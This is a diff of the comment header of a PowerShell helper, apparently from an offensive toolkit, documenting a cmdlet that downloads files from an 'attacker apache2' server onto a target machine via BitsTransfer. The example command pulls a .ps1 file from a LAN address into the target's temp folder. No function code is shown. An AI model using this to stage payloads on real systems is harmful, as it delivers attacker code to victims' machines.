@@ -1,13 +1,27 @@
 ﻿<#
 .SYNOPSIS
-   Author: @r00t-3xp10it
-   Helper - Download Files from Attacker Apache2 (BitsTransfer)
+   Download Files from Attacker Apache2 (BitsTransfer)
+
+   Author: r00t-3xp10it
+   Tested Under: Windows 10 (18363) x64 bits
+   Required Dependencies: none
+   Optional Dependencies: BitsTransfer
+   PS cmdlet Dev version: v1.0.1
 
 .NOTES
    Required Dependencies: BitsTransfer {native}
    File to Download must be stored in attacker apache2 webroot.
    -Upload and -ApacheAddr Are Mandatory parameters (required).
    -Destination parameter its auto set to $Env:TMP by default.
+
+.Parameter Upload
+   Accepts the file name to upload (default path: apache2 webroot)
+
+.Parameter ApacheAddr
+   Accepts the attacker apache2 webserver ip adrress
+
+.Parameter Destination
+   Accepts the absoluct \ relative path of file on target system
 
 .EXAMPLE
    PS C:\> .\Upload.ps1 -Upload FileName.ps1 -ApacheAddr 192.168.1.73 -Destination $Env:TMP\FileName.ps1
